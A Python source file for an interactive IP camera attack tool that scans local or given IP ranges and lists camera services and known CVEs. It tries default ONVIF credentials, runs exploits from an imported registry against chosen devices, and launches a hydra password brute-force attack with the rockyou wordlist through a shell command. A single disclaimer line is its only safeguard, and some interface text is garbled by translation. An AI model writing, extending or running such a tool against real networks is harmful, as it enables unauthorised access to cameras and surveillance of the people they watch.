import subprocess
import ipaddress
import socket
import requests
import xml.etree.ElementTree as ET
import os
import sys
import pkg_resources
import json
import time
import logging
from datetime import datetime
from onvif import ONVIFCamera
import zeep
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
from rich.prompt import Prompt, Confirm
import asyncio
import aiohttp

try:
    from pysnmp.hlapi.asyncio import *
except ImportError:
    pass 
from cve_checker import search_cve_for_product
from exploits import EXPLOIT_REGISTRY

console = Console()
logging.basicConfig(
    filename="ip_camera_tool.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    encoding="utf-8"
)

ASCII_ART = """
  _   _  _______  ___     _______  _______  __   __  _______     _______  _______  
| | _ | ||       ||   |   |       ||       ||  |_|  ||       |   |       ||       |
| || || ||   ___||   |   |       ||   _   ||       ||   ___|   |_     _||   _   |
|       ||  |___ |   |   |       ||  | |  ||       ||  |___      |   |  |  | |  |
|       ||   ___||   |___|      _||  |_|  ||       ||   ___|     |   |  |  |_|  |
|   _   ||  |___ |       |     |_ |       || ||_|| ||  |___      |   |  |       |
|__| |__||_______||_______|_______||_______||_|   |_||_______|     |___|  |_______|
 _______  __   __  _______  ___     ___     __                                              
|       ||  | |  ||       ||   |   |   |   |  |                                             
| _____||  |_|  ||___    ||   |   |   |   |  |                                              
| |_____ |       | ___|   ||   |   |   |   |  |                 
|_____  ||       ||___    ||   |___|   |___|__|                 
 _____| ||   _   | ___|   ||       |       | __                 
|_______||__| |__||_______||_______|_______||__|


 𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘥 𝘣𝘺 @𝘣𝘶𝘳𝘢𝘬𝘵𝘩𝘦𝘳𝘰𝘰𝘵  |  𝘐𝘎: @𝘣𝘶𝘳𝘢𝘬𝘵𝘩𝘦𝘳𝘰𝘰𝘵                 
"""


def load_config():
    try:
        with open("config.json", "r", encoding="utf-8") as f:
            return json.load(f)
    except FileNotFoundError:
        console.print("[red]ERROR: 'config.the 'json' file was not found.[/red]")
        console.print("[yellow]Please send a 'config' containing your NVD API key.create a 'json' file.[/yellow]")
        return None
    except json.JSONDecodeError:
        console.print("[red]ERROR: 'config.the 'json' file is corrupted or invalid.[/red]")
        return None

def display_ascii_animation():
    console.clear()
    lines = ASCII_ART.strip().split("\n")
    total_duration = 1
    line_delay = total_duration / len(lines)
    for line in lines:
        console.print(f"[green]{line}[/green]")
        time.sleep(line_delay)
    time.sleep(3)
    console.clear()

def check_and_install_dependencies():
    console.print("[bold green]The necessary dependencies are being checked...[/bold green]")
    required = {'requests', 'onvif_zeep', 'rich', 'aiohttp', 'pysnmp'}
    installed = {pkg.key for pkg in pkg_resources.working_set}
    missing = required - installed
    if missing:
        for package in missing:
            console.print(f"[yellow]{package} not found, it is being installed...[/yellow]")
            try:
                subprocess.run([sys.executable, "-m", "pip", "install", package], check=True, capture_output=True)
                logging.info(f"{package} it was successfully installed.")
            except subprocess.CalledProcessError as e:
                console.print(f"[red]{package} error when installing: {e.stderr.decode()}[/red]")
                logging.error(f"{package} the installation failed: {e}")
                sys.exit(1)
    
    for tool in ["hydra", "vlc"]:
        try:
            subprocess.run([tool, "-h"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            logging.info(f"{tool} found.")
        except (subprocess.CalledProcessError, FileNotFoundError):
            console.print(f"[red]{tool} not found. Please install it manually.[/red]")
            logging.warning(f"{tool} not found.")
    
    return True

def get_local_ip_range():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.connect(("8.8.8.8", 80))
            local_ip = sock.getsockname()[0]
        network = ipaddress.ip_network(f"{local_ip}/24", strict=False)
        return [str(ip) for ip in network.hosts()]
    except socket.error as e:
        console.print(f"[red]Error when retrieving the local IP range: {e}[/red]")
        return []

async def scan_port(ip, port, timeout=0.5):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=timeout)
        writer.close()
        await writer.wait_closed()
        return True
    except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
        return False
        
async def check_http(ip, ports=[80, 8080, 8081], session=None):
    should_close_session = False
    if session is None:
        session = aiohttp.ClientSession()
        should_close_session = True
    try:
        for port in ports:
            if await scan_port(ip, port):
                try:
                    async with session.get(f"http://{ip}:{port}", timeout=1.5, allow_redirects=False, ssl=False) as response:
                        server_header = response.headers.get("Server", "")
                        text = await response.text(errors='ignore')
                        if response.status == 401 or any(k in text.lower() for k in ["camera", "netcam", "dvr"]):
                            logging.info(f"{ip}:{port} HTTP found. Server: {server_header}")
                            return True, port, server_header
                except (asyncio.TimeoutError, aiohttp.ClientError):
                    continue
    finally:
        if should_close_session:
            await session.close()

    return False, None, None

def _blocking_onvif_check(ip, ports=[80, 3702, 8080], timeout=1.5):
    message = '''<?xml version="1.0" encoding="utf-8"?><Envelope xmlns="http://www.w3.org/2003/05/soap-envelope"><Header><wsa:MessageID xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing">uuid:84ede3de-7dec-11d0-c360-f01234567890</wsa:MessageID><wsa:To xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing">urn:schemas-xmlsoap-org:ws:2005/04/discovery</wsa:To><wsa:Action xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing">http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</wsa:Action></Header><Body><Probe xmlns="http://schemas.xmlsoap.org/ws/2005/04/discovery"><Types xmlns:dn="http://www.onvif.org/ver10/network/wsdl">dn:NetworkVideoTransmitter</Types></Probe></Body></Envelope>'''
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(timeout)
            sock.sendto(message.encode(), (ip, 3702))
            data, _ = sock.recvfrom(4096)
            if b"onvif.org" in data:
                try:
                    addr = data.decode().split("XAddrs>")[1].split("</")[0]
                    port = int(addr.split(":")[2].split("/")[0])
                    return True, port
                except (IndexError, ValueError): return True, 80
    except (socket.timeout, socket.error): pass

    for port in ports:
        try:
            cam = ONVIFCamera(ip, port, "admin", "12345", wsdl_dir=os.path.join(os.path.dirname(__file__), 'wsdl'), connect_timeout=timeout)
            cam.devicemgmt.GetHostname()
            return True, port
        except Exception: continue
    return False, None

async def check_onvif(ip, ports=[80, 2000, 3702, 8080]):
    try:
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(None, _blocking_onvif_check, ip, ports)
    except Exception as e:
        logging.error(f"{ip} ONVIF failed control: {e}")
        return False, None

async def check_rtsp(ip, ports=[554, 8554]):
    for port in ports:
        if await scan_port(ip, port):
            return True, port
    return False, None

async def check_snmp(ip, community='public', timeout=1.0):
    try:
        snmp_engine = SnmpEngine()
        error_indication, error_status, _, var_binds = await get(snmp_engine, CommunityData(community, mpModel=0), UdpTransportTarget((ip, 161), timeout=timeout, retries=0), ObjectType(ObjectIdentity('1.3.6.1.2.1.1.1.0')))
        snmp_engine.transportDispatcher.closeDispatcher()
        if not error_indication and not error_status:
            description = str(var_binds[0][1])
            logging.info(f"{ip} SNMP found: {description}")
            return (True, description) if any(k in description.lower() for k in ['camera', 'nvr', 'dvr', 'ipnc']) else (False, description)
    except Exception as e:
        logging.debug(f"SNMP Error during scanning ({ip}): {e}")
    return False, None

class SSDPProtocol(asyncio.DatagramProtocol):
    def __init__(self, found_devices):
        self.found_devices = found_devices
    def connection_made(self, transport):
        self.transport = transport
        message = 'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n'
        self.transport.sendto(message.encode(), ('239.255.255.250', 1900))
    def datagram_received(self, data, addr):
        ip, _ = addr
        if ip not in self.found_devices:
            response_text = data.decode(errors='ignore')
            server = next((line.split(":", 1)[1].strip() for line in response_text.splitlines() if line.lower().startswith("server:")), "N/A")
            if any(k in server.lower() for k in ['camera', 'nvr', 'dvr', 'ip camera']):
                location = next((line.split(":", 1)[1].strip() for line in response_text.splitlines() if line.lower().startswith("location:")), "N/A")
                self.found_devices[ip] = {"ip": ip, "ssdp_server": server, "ssdp_location": location, "discovery": "SSDP"}
    def error_received(self, exc):
        logging.error(f'SSDP error: {exc}')

async def discover_ssdp(timeout=5):
    found_devices = {}
    loop = asyncio.get_running_loop()
    try:
        transport, _ = await loop.create_datagram_endpoint(lambda: SSDPProtocol(found_devices), local_addr=('0.0.0.0', 0))
        await asyncio.sleep(timeout)
    finally:
        if 'transport' in locals() and transport: transport.close()
    return found_devices

async def scan_ip(ip, results_dict, progress, semaphore, api_key, session):
    async with semaphore:
        try:
            tasks = {
                "http": asyncio.create_task(check_http(ip, session=session)),
                "onvif": asyncio.create_task(check_onvif(ip)),
                "rtsp": asyncio.create_task(check_rtsp(ip)),
                "snmp": asyncio.create_task(check_snmp(ip)),
            }
            await asyncio.gather(*tasks.values(), return_exceptions=True)

            http_result, http_port, server_header = tasks["http"].result() if not tasks["http"].exception() else (False, None, None)
            onvif_result, onvif_port = tasks["onvif"].result() if not tasks["onvif"].exception() else (False, None)
            rtsp_result, rtsp_port = tasks["rtsp"].result() if not tasks["rtsp"].exception() else (False, None)
            snmp_result, snmp_desc = tasks["snmp"].result() if not tasks["snmp"].exception() else (False, None)

            if http_result or onvif_result or rtsp_result or snmp_result:
                if ip not in results_dict:
                    results_dict[ip] = {"ip": ip, "discovery": "Port Scan"}
                
                if http_result: results_dict[ip].update({"http": True, "http_port": http_port})
                if onvif_result: results_dict[ip].update({"onvif": True, "onvif_port": onvif_port})
                if rtsp_result: results_dict[ip].update({"rtsp": True, "rtsp_port": rtsp_port})
                if snmp_result: results_dict[ip].update({"snmp": True, "snmp_details": snmp_desc})

                if server_header:
                    cves = await search_cve_for_product(server_header, api_key, session)
                    if cves:
                        results_dict[ip]["cves"] = cves
        except Exception as e:
            logging.error(f"{ip} the main error when scanning: {str(e)}")
        finally:
            if progress.tasks:
                progress.update(progress.tasks[-1].id, advance=1)

async def scan_network(ip_range=None, api_key=None):
    if not ip_range: ip_range = get_local_ip_range()
    if not ip_range:
        console.print("[red]The IP range could not be found. Leaving.[/red]")
        return []
    
    results_dict = {}
    async with aiohttp.ClientSession() as session:
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), console=console) as progress:
            ssdp_task_id = progress.add_task("[cyan]Rapid discovery is being made with SSDP...", total=1)
            ssdp_results = await discover_ssdp()
            results_dict.update(ssdp_results)
            progress.update(ssdp_task_id, completed=1, description="[green]SSDP discovery completed.[/green]")

            port_scan_task_id = progress.add_task("[cyan]Scanning the IP range...", total=len(ip_range))
            semaphore = asyncio.Semaphore(100)
            tasks = [scan_ip(ip, results_dict, progress, semaphore, api_key, session) for ip in ip_range]
            await asyncio.gather(*tasks)
    
    return list(results_dict.values())

def display_results(results):
    if not results:
        console.print("[yellow]No potential cameras were found on the network.[/yellow]")
        return [], [], []

    results.sort(key=lambda r: ipaddress.ip_address(r['ip']))
    
    table = Table(title="Detected Devices and Services", show_header=True, header_style="bold magenta")
    table.add_column("IP Address", style="cyan", no_wrap=True)
    table.add_column("Services", style="green")
    table.add_column("Details", style="yellow")

    http_cams, onvif_cams, rtsp_cams = [], [], []

    for r in results:
        services, details = [], f"[bold]Discovery:[/] {r.get('discovery', 'N/A')}\n"
        if r.get('http'):
            services.append(f"HTTP ({r.get('http_port')})"); http_cams.append((r['ip'], r.get('http_port')))
        if r.get('onvif'):
            services.append(f"ONVIF ({r.get('onvif_port')})"); onvif_cams.append((r['ip'], r.get('onvif_port')))
        if r.get('rtsp'):
            services.append(f"RTSP ({r.get('rtsp_port')})"); rtsp_cams.append((r['ip'], r.get('rtsp_port')))
        if r.get('snmp'): services.append("SNMP")
        if r.get('snmp_details'): details += f"[bold]SNMP Desc:[/] {r['snmp_details'][:50]}...\n"
        if r.get('ssdp_server'): details += f"[bold]SSDP Server:[/] {r['ssdp_server'][:50]}...\n"
        
        if r.get("cves"):
            exploitable_cves = sum(1 for cve in r["cves"] if cve["id"] in EXPLOIT_REGISTRY)
            details += f"[bold red]CVEs: {len(r['cves'])}[/] "
            if exploitable_cves > 0: details += f"[bold green](Exploit: {exploitable_cves})[/bold green]"

        table.add_row(r['ip'], "\n".join(services), details.strip())
        
    console.print(table)
    return http_cams, onvif_cams, rtsp_cams

async def handle_vulnerabilities(device_info):
    cves = device_info.get("cves", [])
    if not cves:
        console.print("[yellow]Bu cihaz için listelenecek CVE bulunamadı.[/yellow]"); time.sleep(2)
        return

    while True:
        console.clear()
        table = Table(title=f"Vulnerabilities: {device_info['ip']}", show_header=True, header_style="bold red")
        table.add_column("No", style="cyan"); table.add_column("CVE ID", style="magenta"); table.add_column("CVSS v3.1", style="yellow")
        table.add_column("Description", style="white", max_width=70); table.add_column("Exploit?", style="green")

        exploitable_options = {str(i): cve['id'] for i, cve in enumerate(cves, 1) if cve['id'] in EXPLOIT_REGISTRY}
        
        for i, cve in enumerate(cves, 1):
            exploit_status = "[bold]Available![/]" if cve['id'] in EXPLOIT_REGISTRY else "No"
            table.add_row(str(i), cve['id'], str(cve.get('score', 'N/A')), cve.get('description', 'N/A'), exploit_status)
        
        console.print(table)
        console.print("\n[bold]Actions:[/bold]\n[E] try the exploit (It's just 'Present!' for what happened)\n[G] Turn back")
        choice = Prompt.ask("Your choice", choices=["E", "G"], default="G").upper()
        
        if choice == "G": break
        elif choice == "E":
            if not exploitable_options:
                console.print("[yellow]There are no exploits to try.[/yellow]"); time.sleep(2); continue
            
            cve_no = Prompt.ask("Which CVE Number would you like to try?", choices=list(exploitable_options.keys()))
            cve_id_to_exploit = exploitable_options[cve_no]
            exploit_function = EXPLOIT_REGISTRY[cve_id_to_exploit]
            port = device_info.get("http_port")
            if not port: console.print("[red]The target port for the exploit has not been found![/red]"); continue
            
            async with aiohttp.ClientSession() as session:
                result = await exploit_function(device_info['ip'], port, session)
                console.print(f"\n[bold blue]Exploit Result:[/bold blue]\n{result}")
            Prompt.ask("\nPress Enter to continue...")


def user_selection(results, http_cams, onvif_cams, rtsp_cams):
    if not results: return

    while True:
        options, vulnerable_devices = {}, [r for r in results if r.get("cves")]
        idx = 1
        console.print("\n[bold magenta]Choose any process:[/bold magenta]")

        if http_cams: options[str(idx)] = ("http", "Brute Force Attack on the HTTP Interface", http_cams); idx += 1
        if onvif_cams: options[str(idx)] = ("onvif", "Acces the ONVIF Camera", onvif_cams); idx += 1
        if rtsp_cams: options[str(idx)] = ("rtsp", "Open the RTSP Camera Stream", rtsp_cams); idx += 1
        if vulnerable_devices: options[str(idx)] = ("vuln", "View and Exploit Vulnerabilities", vulnerable_devices); idx += 1
        options[str(idx)] = ("exit", "Return to the Main Menu", [])

        for i, (_, desc, _) in options.items(): console.print(f"{i}. {desc}")
        
        choice = Prompt.ask("[cyan]Your choices[/cyan]", choices=list(options.keys()))
        action, _, target_list = options[choice]

        if action == "exit": break
        
        console.print(f"\n[bold magenta]Choose the target IP Address:[/bold magenta]")
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("No", style="cyan"); table.add_column("IP Address", style="green")
        if action != "vuln": table.add_column("Port", style="yellow")

        for i, device in enumerate(target_list, 1):
            ip = device['ip'] if isinstance(device, dict) else device[0]
            port = device.get('http_port') if isinstance(device, dict) else (device[1] if len(device) > 1 else 'N/A')
            if action != "vuln": table.add_row(str(i), ip, str(port))
            else: table.add_row(str(i), ip)

        console.print(table)
        ip_choice = Prompt.ask("[cyan]Enter the any number[/cyan]", choices=[str(i) for i in range(1, len(target_list) + 1)])
        
        try:
            chosen_device = target_list[int(ip_choice) - 1]
            if action == "vuln":
                asyncio.run(handle_vulnerabilities(chosen_device))
            else:
                ip, port = chosen_device
                if action == "http": brute_force_http(ip, port)
                elif action == "onvif": handle_onvif(ip, port)
                elif action == "rtsp": handle_rtsp(ip, port)
        except (IndexError, ValueError) as e:
            console.print(f"[red]Invalid choice: {e}[/red]")

def brute_force_http(ip, port):
    userlist, wordlist = "usernames.txt", "rockyou.txt"
    if not os.path.exists(userlist) or not os.path.exists(wordlist):
        console.print(f"[red]Error: '{userlist}' and/or '{wordlist}' not found.[/red]"); return
    command = f'hydra -L {userlist} -P {wordlist} {ip} -s {port} http-get / -t 4 -f'
    console.print(f"[cyan]Launching a brute force attack: {command}[/cyan]")
    subprocess.run(command, shell=True)

def handle_onvif(ip, port):
    pass

def handle_rtsp(ip, port):
    pass

async def main_menu():
    display_ascii_animation()
    console.print("[bold blue]IP Camera Scanning and Analysis Tool v1.0[/bold blue]")
    console.print("[yellow]This tool should only be used for legal and ethical purposes. Malicious use belongs entirely to the user![/yellow]")
    
    config = load_config()
    if not config: sys.exit(1)
    
    check_and_install_dependencies()
    api_key = config.get("NVD_API_KEY")

    while True:
        console.print("\n[bold magenta]Main Menu:[/bold magenta]")
        console.print("1. Scan the Local Network"); console.print("2. Scan the Private IP Range"); console.print("3. Exit")
        choice = Prompt.ask("[cyan]Make your choice (1-3)[/cyan]", choices=["1", "2", "3"])
        
        results = []
        ip_list = None
        if choice == "1":
            ip_list = get_local_ip_range()
        elif choice == "2":
            ip_range_str = Prompt.ask("[cyan]Enter the IP Range (192.168.1.0/24)[/cyan]")
            try:
                ip_list = [str(ip) for ip in ipaddress.ip_network(ip_range_str, strict=False).hosts()]
            except ValueError as e:
                console.print(f"[red]Invalid IP Range: {e}[/red]"); continue
        elif choice == "3": break

        if ip_list:
            results = await scan_network(ip_list, api_key=api_key)
      
        if results:
            http_cams, onvif_cams, rtsp_cams = display_results(results)
            if Confirm.ask("\n[cyan]Would you like to save the results to a file?[/cyan]", default=False):
                save_results(results) 
            user_selection(results, http_cams, onvif_cams, rtsp_cams)
        elif choice in ["1", "2"]:
            display_results([])
    
    console.print("[green]Shutdowning...[/green]")

def save_results(results):
    if not results: console.print("[yellow]There are no results to be recorded.[/yellow]"); return
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"scan_results_{timestamp}.json"
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=4, ensure_ascii=False)
    console.print(f"[green]Results {filename} it was saved in his file.[/green]")

if __name__ == "__main__":
    try:
        if not os.path.exists('wsdl'):
            console.print("[yellow]'wsdl' the folder could not be found. It is required for ONVIF features.[/yellow]")
        asyncio.run(main_menu())
    except KeyboardInterrupt:
        console.print("\n[yellow]The transaction was canceled by the user.[/yellow]")
    except ImportError:
        console.print("[red]A required library (pysnmp) could not be installed. Please complete the installation by running the script again.[/red]")
    except Exception as e:
        console.print(f"[bold red]An unexpected error occurred: {e}[/bold red]")
        logging.critical("Critical error in the main program cycle", exc_info=True)
